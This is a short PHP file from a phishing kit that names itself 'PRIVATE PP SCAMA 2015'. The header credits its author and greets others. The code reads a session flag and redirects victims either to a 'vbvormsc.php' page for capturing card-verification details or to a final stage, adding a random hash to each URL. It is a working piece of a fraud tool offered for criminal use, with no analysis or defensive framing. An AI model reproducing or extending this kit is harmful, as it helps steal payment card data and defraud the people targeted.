<?php
session_start();

/*

+----------------------------------+
�--- PRIVATE  PP SCAMA   2015 -----�
�---------- Ver : 2.0 -------------�
�--------- BY Dz[NO_o]B -----------�
�----------- GREETZ TO ------------�
�--- Dz Phoniex : Dz Injector -----�
�----------------------------------�
�https://code.google.com/p/dznoob/ �
�----------------------------------�
�https://facebook.com/DzNOoBpage   �
+----------------------------------+


*/

if ($_SESSION['vbv'] == '1') {


?>
<meta http-equiv="refresh" content="0;URL=vbvormsc.php?y= <?php echo md5(rand(100, 999999999)); ?>" />
<?php

 }

 else  {



?>

<meta http-equiv="refresh" content="0;URL=last/index.php?y= <?php echo md5(rand(100, 999999999)); ?>" />
	
<?php

 }
?>
